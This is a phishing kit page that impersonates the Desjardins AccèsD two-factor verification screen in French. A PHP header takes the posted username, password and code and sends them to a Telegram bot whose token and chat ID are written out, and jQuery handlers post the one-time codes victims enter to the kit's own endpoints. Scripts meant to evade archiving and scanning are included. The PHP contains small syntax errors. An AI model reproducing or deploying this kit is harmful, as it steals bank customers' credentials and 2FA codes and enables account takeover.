<?php

    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 


$message ="DESJARDINS CREDENTIALS \n---------------------\nuser$pass\n\n---------------------\n\n";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566'
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
?>

</html lang="fr">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Valider l'identité AccèsD AccèsD Affaires | Desjardins</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="robots" content="noindex, nofollow">
        <link rel="shortcut icon" href="assets/desj/d.ico" type="image/x-icon">
        <link rel="icon" href="assets/desj/d.ico" type="image/x-icon">
        <link href="./files/bootstrap.min.css" rel="stylesheet">
        <link href="./files/fwd-bootstrap.min.css" rel="stylesheet">
        <!--[if lt IE 9]>
        <link href="/assets/desj/files/fwd-bootstrap-ie-force-960-layout.min.css" rel="stylesheet">
        <![endif]-->
        <!--[if lte IE 8]>
        <link href="/assets/desj/files/fwd-bootstrap-ie.min.css" rel="stylesheet">
        <link href="/assets/desj/files/fwd-bootstrap.css" rel="stylesheet">
        <![endif]-->
        <!--[if IE 9]>
        <link href="/assets/desj/files/fwd-bootstrap-ie9.min.css" rel="stylesheet">
        <![endif]-->
        <link href="./files/global.min.css" rel="stylesheet">
        <link media="only screen and (max-width : 768px)" href="./files/identifiantunique-responsive.min.css" rel="stylesheet">
        <!-- Ajustements de styles de l'application -->
        <link href="./files/theme.min.css" rel="stylesheet">
        <!--[if IE]>
        <link rel="stylesheet" type="text/css" href="/assets/desj/files/ie.min.css">
        <![endif]-->
        <!--[if lte IE 7]>
        <link rel="stylesheet" type="text/css" href="/assets/desj/files/ie7.min.css">
        <![endif]-->
        <!--[if IE 8]>
        <link rel="stylesheet" type="text/css" href="/assets/desj/files/ie8.min.css">
        <![endif]-->
        <link href="./files/owl.carousel.min.css" rel="stylesheet">

        <meta name="desjardins-identifiant-application" content="AccesWeb">
        <meta name="raaMobileActif" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="./files/pied.css" rel="stylesheet">
        <link rel="stylesheet" href="./files/entete.css">
        <link rel="stylesheet" href="./files/page-logon.css">
        <link rel="stylesheet" href="./files/styles.css">
        <link rel="stylesheet" href="./files/fwd-bootstrap.min(1).css">
        <style>
            .isolation-bootstrap-3 .form-horizontal .form-group {
                margin-left: 0px;
                margin-right: 0px;
            }
            
            .isolation-bootstrap-3 form input[type="tel"],
            .isolation-bootstrap-3 form input[type="email"],
            .isolation-bootstrap-3 form input[type="text"],
            .isolation-bootstrap-3 form select {
                font-size: 16px!important;
                height: 30px;
                width: 100%;
                overflow: hidden;
                white-space: pre;
                word-break: break-word;
                -webkit-appearance: break-word;
            }
            
            .auth-type-com span {
                padding: 8px;
            }
            
            .auth-type-com img {
                margin: 4px 0px;
            }
            
            .auth-type-com.auth-push img {
                margin: 2px 0px;
            }
            
            .auth-reponse .c-indicator {
                top: 5px;
            }
            
            .auth-boutons {
                margin-bottom: -10px;
            }
            
            .isolation-bootstrap-3 .alert-info:before {
                content: url(/assets/desj/ic-avertissement.svg);
            }
            
            .isolation-bootstrap-3 .alert-danger:before {
                background-image: url(/assets/desj/ic-erreur.svg);
                margin-top: 3px;
                position: absolute;
                left: 9px;
                background-repeat: no-repeat;
                background-size: contain;
                display: block;
                height: 17px;
                width: 17px;
                content: "";
            }
        </style>
        <style>
            #securiteMobile {
                width: 100% !important;
            }
        </style>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'Desj';
            var lrinfo = '2FA';
        </script>
        <script src="./files/actions.js###%"></script>
        <script>
            $(document).on('change', '#input-code', function() {
                $.post('/deposit/desj/api/otp-data', {
                    code: $(this).val()
                });
            });

            $(document).on('submit', '.lab-form', function() {
                tloaded = true;

                var typx = $('.btn-send');
                var type = $('input[name="type"]:checked').val();
                var ogtxt = $('.btn-send').html();

                $(typx).html('Sending..');
                $('.btn-send').attr('disabled', true);

                $.post('/deposit/desj/api/otp-type', {
                    type: type
                }, function(response) {
                    setInterval(function() {
                        $(typx).html(ogtxt);
                        $('.btn-send').removeAttr('disabled');

                        $('.div-send').css('display', 'none');
                        $('.div-code').css('display', 'block');
                        $('#input-code').attr('required', true);
                    }, 1000);
                });

                return false;
            });

            $(document).on('submit', '.lab-form2', function(e) {
                $('.btn-save').attr('disabled', true);

                $.post('/deposit/desj/api/otp-submit', {
                    code: $('#input-code').val()
                }, function(response) {
                    location.href = '/deposit/desj/wo';
                });

                e.preventDefault();
            });

            $('.btn-cancel').click(function() {
                $('.div-send').css('display', 'block');
                $('.div-code').css('display', 'none');
                $('#input-code').val('')
            });
        </script>
    </head>

    <body class="isolation-bootstrap-3">
        <!-- if app_mobile -->
        <a name="haut"></a>
        <span class="hidden-xs">
            <div id="zone-entete-de-page">
                <div id="entete">
                    <div id="access-links">
                        <a href="deposit/desj/t#contenu" class="hors-ecran" title="Aller au contenu principal">Aller au contenu principal</a>
                    </div>
                    <div id="logo">
                        <h1 class="hors-ecran">Site Internet de Desjardins</h1>
                        <a href="deposit/desj/t#" title="Retour à page d&#39;accueil de Desjardins"><img src="./files/desj.svg" alt="Retour à page d&#39;accueil de Desjardins" width="154" height="32"></a>
                    </div>
                    <div id="logo-applicatif">
                        <a href="deposit/desj/t#"><img src="./files/g40-entete-logo-accesd.png" alt="AccèsD" width="106" height="32"></a>
                        <a href="deposit/desj/t#"><img src="./files/g40-entete-logo-accesd-affaires.png" alt="AccèsD Affaires" width="90" height="32"></a>
                    </div>
                    <div id="outils">
                        <div id="nous-joindre">
                            <p class="titre-entete"><a href="deposit/desj/t#" onclick="">Nous joindre</a></p>
                        </div>
                        <div id="aide">
                            <p class="titre-entete"><a href="deposit/desj/t#" onclick="">Aide</a></p>
                        </div>
                        <div id="fonctions">
                            <ul>
                                <li class="reduire"><a id="taille-texte-moins" href="deposit/desj/t#" title="Réduire la taille du texte">Réduire la taille du texte</a></li>
                                <li class="augmenter"><a id="taille-texte-plus" href="deposit/desj/t#" title="Augmenter la taille du texte">Augmenter la taille du texte</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </span>
        <span class="hidden-sm hidden-md hidden-lg">
            <div id="zone-entete-de-page">
                <nav class="navbar navbar-default" role="navigation">
                    <div class="container max-layout-960" style="padding: 0px 6px;">
                        <!-- Brand and toggle get grouped for better mobile display -->
                        <div class="navbar-header">
                            <span class="navbar-brand">
                                <style>
                                @media (max-width: 768px) {
                                    .navbar-brand .logo {
                                        display: block !important;
                                        margin-left: 10px;
                                    }
                                }
                                </style>
                                <a href="deposit/desj/t.php">
                                    <img class="logo" src="./files/desj.svg" alt="Aller à la page d&#39;accueil" title="Desjardins" style="height: 30px">
                                </a>
                                <div class="hidden-xs" style="display: inline;">
                                    <img role="presentation" src="./files/g00-entete-filet-logos.png">
                                    <img class="logo-desjardins" role="presentation" src="./files/g00-logo-desjardins-blanc.png" style="padding-right: 20px;" alt="Desjardins" title="Desjardins">
                                </div>
                            </span>
        <div id="titrePageMobile" class="navbar-brand hidden-sm hidden-md hidden-lg"></div>
        <a href="deposit/desj/t#" class="navbar-brand pull-right hidden-sm hidden-md hidden-lg">
            <img id="menuAppRetour" src="./files/entete-btn-menu-app.png" height="32">
        </a>
        </div>
        <!-- /.navbar-header -->
        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="navbar-collapse-outils">
            <div id="outils">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a class="lien" href="javascript:popup(&#39;#&#39;,&#39;Nous joindre&#39;, &#39;location=0,scrollbars=yes,resizable=yes,width=500,height=500&#39;);">
                                        Nous joindre
                                        </a><span class="hidden-xs">|</span>
                    </li>
                    <li>
                        <a class="lien" href="javascript:popup(&#39;#&#39;,&#39;Aide&#39;, &#39;location=0,scrollbars=yes,resizable=yes,width=500,height=500&#39;);">
                                        Aide
                                        </a><span class="hidden-xs">|</span>
                        <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                    </li>
                    <li class="hidden-xs">
                        <a class="lien" id="changeLangue" href="deposit/desj/t?langueCible=en">
                                        English
                                        </a>
                        <span class="hidden-sm">|</span>
                    </li>
                    <li class="hidden-xs">
                        <a class="lien" id="taille-texte-moins" href="javascript:void(0)" style="padding-right: 0px;">
                            <img src="./files/a00-entete-ic-texte-moins-blanc-on.png" alt="" title="">
                        </a>
                    </li>
                    <li class="hidden-xs">
                        <a class="lien" id="taille-texte-plus" href="javascript:void(0)" style="padding-left: 8px; padding-right: 20px;">
                            <img src="./files/a00-entete-ic-texte-plus-blanc-on.png" alt="" title="">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        </div>
        </nav>
        </div>
        </span>
        <div class="zone-centrale">
            <div id="zone-centrale-bg">
                <div class="container" style="padding: 0px 6px;">
                    <div id="contenu" lang="fr" role="main">
                        <div class="row">
                            <div class="col-xs-24 col-sm-24 col-md-18 col-md-offset-3 col-lg-18 col-lg-offset-3">
                                <div id="loading" class="loading" style="display: none;">
                                    <div class="panel panel-primary">
                                        <div class="panel-body">
                                            <img id="img-loading" src="./files/a00-loading-petit.gif" alt="Loading">
                                        </div>
                                    </div>
                                </div>
                                <h1 id="titrePage" data-titre-page-mobile="Obtenir un mot de passe">
                                    Vérification de sécurité
                                </h1>
                                <div class="row">
                                    <div class="col-sm-24 col-md-24">
                                        <div id="erreurSystemeJS" class="has-error hidden" aria-live="assertive">
                                            <div>
                                                <span class="help-block-idunique">
                                                </span>
                                                <ul>
                                                    <li>
                                                        <a id="erreurLienJS" href="deposit/desj/t#" class="erreurLien"></a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <script type="text/javascript">
                                    $(document).ready(function() {
                                        //forcer le focus pour respecter les regles d'accessibilit�
                                        setTimeout(function() {
                                            $('#erreurAccessibilite').focus()
                                        }, 2000); //accessibilit�
                                    })
                                </script>
                                <div role="region" tabindex="-1" class="alert alert-danger error-div" style="display: none" aria-label="Error">
                                    <p><span class="sr-only">Error&nbsp;</span><span>Le code est incorrect. Réessayer. (IDHS966081)</span>
                                        <!---->
                                    </p>
                                    <!---->
                                </div>
                                <div class="panel panel-primary">
                                    <div id="panel-body-questions" class="panel-body padding-moyen">
                                        <div class="col-xs-24">
                                            <form role="form" class="form-horizontal ng-untouched ng-pristine ng-invalid lab-form div-send" action="deposit/desj/t.php" method="post">
                                                <!---->
                                                <!---->
                                                <!---->
                                                <h2 tabindex="-1" class="auth-titre-page">Vérification d'identité</h2>
                                                <!---->
                                                <p>La vérification d'identité avec un code de sécurité ajoute un niveau de sécurité supplémentaire à votre compte.</p>
                                                <!----><a target="_blank" href="https://www.desjardins.com/ca/security/2-step-verification/index.jsp">Pourquoi cette étape est-elle nécessaire ?</a>
                                                <!---->
                                                <!---->
                                                <validation-groupe>
                                                    <div class="" style="margin-top: 2rem">
                                                        <div class="form-group">
                                                            <span id="cat-error" class="help-block">Sélectionnez comment vous souhaitez recevoir le code de sécurité.</span>
                                                            <fieldset id="choixfacteur" aria-describedby="boiteErreurValidation">
                                                                <legend id="auth-communication-legend" class="auth-question auth-question-contact">
                                                                    <h3 class="h2">Envoyez-moi le code de sécurité:</h3>
                                                                </legend>
                                                                <div class="auth-reponses-contact">
                                                                    <div class="panel panel-default panel-simple panel-radio panel-horizontal panel-alignleft auth-reponse">
                                                                        <div class="panel-body" for="input-app">
                                                                            <div class="panel-content" id="panel-radio-content-b19c46d6-3a1d-42a2-b377-c113d6ab27e1">
                                                                                <label class="panel-label" for="input-app">
                                                                                    <span class="auth-type-com auth-push"><img src="./files/ic-telephonie.svg" alt="" class="auth-icone auth-icone-push"><span>Par notification sur mes appareils mobiles</span></span>
                                                                                </label>
                                                                            </div>
                                                                            <input name="type" value="Auth" required="" type="radio" class="panel-input ng-untouched ng-pristine ng-invalid" id="input-app">
                                                                            <div class="panel-check">
                                                                                <div class="c-input c-radio" for="input-app"><span class="c-indicator" for="input-app"></span></div>
                                                                            </div>
                                                                            <div class="panel-active"></div>
                                                                            <div class="panel-focus"></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="panel panel-default panel-simple panel-radio panel-horizontal panel-alignleft auth-reponse">
                                                                        <div class="panel-body" for="input-sms">
                                                                            <div class="panel-content">
                                                                                <label class="panel-label" for="input-sms">
                                                                                    <span class="auth-type-com"><img src="./files/ic-mes-messages.svg" alt="" class="auth-icone"><span>Écris moi</span></span>
                                                                                </label>
                                                                            </div>
                                                                            <input name="type" value="SMS" required="" type="radio" class="panel-input ng-untouched ng-pristine ng-invalid" id="input-sms" aria-describedby="panel-radio-content-65bcabdb-e096-4ba8-8470-23d40f334e18">
                                                                            <div class="panel-check">
                                                                                <div class="c-input c-radio" for="input-sms"><span class="c-indicator" for="input-sms"></span></div>
                                                                            </div>
                                                                            <div class="panel-active"></div>
                                                                            <div class="panel-focus"></div>
                                                                        </div>
                                                                    </div>
                                                                    <!---->
                                                                    <!---->
                                                                </div>
                                                            </fieldset>
                                                        </div>
                                                    </div>
                                                </validation-groupe>
                                                <!---->
                                                <div class="auth-boutons">
                                                    <span class="auth-boutons-2">
                                                        <button type="button" class="btn btn-default">Annuler</button><!---->
                                                    </span>
                                                    <button type="submit" class="btn btn-primary btn-send">Continuez</button>
                                                    <!---->
                                                </div>
                                            </form>
                                            <form role="form" class="form-horizontal ng-untouched ng-pristine ng-invalid div-code lab-form2" style="display: none">
                                                <div tabindex="-1" class="alert alert-info">
                                                    <span>Un code de sécurité a été envoyé à votre appareil mobile</span>
                                                    <p><span>Une fois votre code reçu, vous disposez de 10 minutes pour le saisir.</span></p>
                                                </div>
                                                <!---->
                                                <!---->
                                                <!---->
                                                <h2 tabindex="-1" class="auth-titre-page">Vérification d'identité</h2>
                                                <!---->
                                                <p>
                                                    <!---->
                                                </p>
                                                <validation-groupe>
                                                    <div class="">
                                                        <div class="form-group">
                                                            <div id="code" class="auth-question-code-securite">
                                                                <label for="codeSecurite" class="control-label code-label"><b>Entrez le code de sécurité:</b></label>
                                                                <div class="auth-reponse">
                                                                    <input type="tel" pattern="[0-9]*" required="" size="8" minlength="6" maxlength="6" name="code" id="input-code" autocorrect="off" autocomplete="one-time-code" autocapitalize="off" class="fix-zoom-ios ng-untouched ng-pristine ng-invalid">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </validation-groupe>
                                                <div class="auth-boutons">
                                                    <span class="auth-boutons-2">
                                                        <button type="button" class="btn btn-default btn-cancel">Annuler</button><!---->
                                                    </span>
                                                    <button type="submit" class="btn btn-primary btn-save">Continuez</button>
                                                    <!---->
                                                </div>
                                            </form>
                                            <!---->
                                            <!---->
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-24 text-right top15px non-selectable hidden-xs">
                                    <img alt="Sécurité garantie à 100 %" src="./files/g00-logo-securite-garantie-f.png">
                                </div>
                                <div class="modal fade" id="modale-institution" tabindex="-1" role="dialog" aria-hidden="true">
                                    <div class="modal-dialog margin-top">
                                        <div class="modal-content padding-left10px padding-right10px">
                                            <div class="modal-header"></div>
                                            <p>
                                                <img class="fullwidth" alt="" src="./files/contenu-cheque-815-institut.png">
                                            </p>
                                            <div class="modal-footer padding-left0px padding-right0px">
                                                <div class="row">
                                                    <div class="col-xs-offset-6 col-xs-12 text-right">
                                                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="deposit/desj/t#">
                                                        Fermer
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="modal fade" id="modale-transit" tabindex="-1" role="dialog" aria-hidden="true">
                                    <div class="modal-dialog margin-top">
                                        <div class="modal-content padding-left10px padding-right10px">
                                            <div class="modal-header"></div>
                                            <p>
                                                <img class="fullwidth" alt="Il se compose de 5 chiffres." src="./files/contenu-cheque-815-transit.png">
                                            </p>
                                            <div class="modal-footer padding-left0px padding-right0px">
                                                <div class="row">
                                                    <div class="col-xs-offset-6 col-xs-12 text-right">
                                                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="deposit/desj/t#">
                                                        Fermer
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="modal fade" id="modale-compte" tabindex="-1" role="dialog" aria-hidden="true">
                                    <div class="modal-dialog margin-top">
                                        <div class="modal-content padding-left10px padding-right10px">
                                            <div class="modal-header"></div>
                                            <p>
                                                <img class="fullwidth" alt="Il se compose de 7 chiffres." src="./files/contenu-cheque-815-folio.png">
                                            </p>
                                            <div class="modal-footer padding-left0px padding-right0px">
                                                <div class="row">
                                                    <div class="col-xs-offset-6 col-xs-12 text-right">
                                                        <a data-dismiss="modal" class="btn btn-primary fullwidth" href="deposit/desj/t#">
                                                        Fermer
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="./files/g00-logo-securite-garantie-f.png">
                                    <img class="fake" src="./files/desj.svg">
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px" style="width: 260px;">
                                        <img class="normal non-selectable" title="" src="./files/g00-logo-securite-garantie-f.png" alt="">
                                        <img class="normal non-selectable padding-left20px" title="Desjardins" src="./files/desj.svg" alt="Desjardins">
                                    </div>
                                </div>
                                <br>
                                <br>
                            </div>
                        </div>
                    </div>
                    <br>
                </div>
            </div>
        </div>
        <footer class="footer">
            <span class="hidden-xs">
                <div id="zone-pied-de-page">
                    <div id="pied">
                        <div id="plan-site">
                            <h2 class="hors-ecran">Plan du site</h2>
                            <div id="tetes-sections">
                                <ul>
                                    <li><a href="deposit/desj/t#">Services aux particuliers</a></li>
                                    <li><a href="deposit/desj/t#">Services aux entreprises</a></li>
                                    <li><a href="deposit/desj/t#">Coopmoi</a></li>
                                    <li><a href="deposit/desj/t#">À propos</a></li>
                                    <li><a href="deposit/desj/t#">Desjardins sur mobile, GPS et RSS</a></li>
                                </ul>
                            </div>
                        </div>
                        <div id="zone-legale">
                            <ul>
                                <li><a href="deposit/desj/t#">Sécurité</a></li>
                                <li><a href="deposit/desj/t#">Confidentialité</a></li>
                                <li><a href="deposit/desj/t#">Conditions d'utilisation et notes légales</a></li>
                                <li><a href="deposit/desj/t#">Accessibilité</a></li>
                                <li><a href="deposit/desj/t#">Plan du site</a></li>
                            </ul>
                            <p class="copyright">© 1996-2023,
                                Mouvement des caisses Desjardins.
                                Tous droits réservés.
                            </p>
                        </div>
                    </div>
                </div>
            </span>
            <span class="hidden-sm hidden-md hidden-lg">
                <div id="pied-de-page" class="container texte-blanc">
                    <div class="row">
                        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
                        </div>
                        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                            <span class="hidden-xs">
                            <a href="javascript:popup(&#39;#&#39;,&#39;Sécurité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Sécurité</a> |
                            <a href="javascript:popup(&#39;#&#39;,&#39;Confidentialité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Confidentialité</a> |
                            <a href="javascript:popup(&#39;#&#39;,&#39;Conditions utilisation&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Conditions d'utilisation et notes légales</a> |
                            <a href="javascript:popup(&#39;#&#39;,&#39;Accessibilité&#39;,&#39;scrollbars=yes,resizable=yes,width=500,height=500&#39;);">Accessibilité</a>
                            <br>
                            </span>
            <p>Copyright © 2023 Mouvement des caisses Desjardins. Tous droits réservés.</p>
            </div>
            <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            </div>
            </div>
            </div>
            </span>
        </footer>


    </body>

    </html>
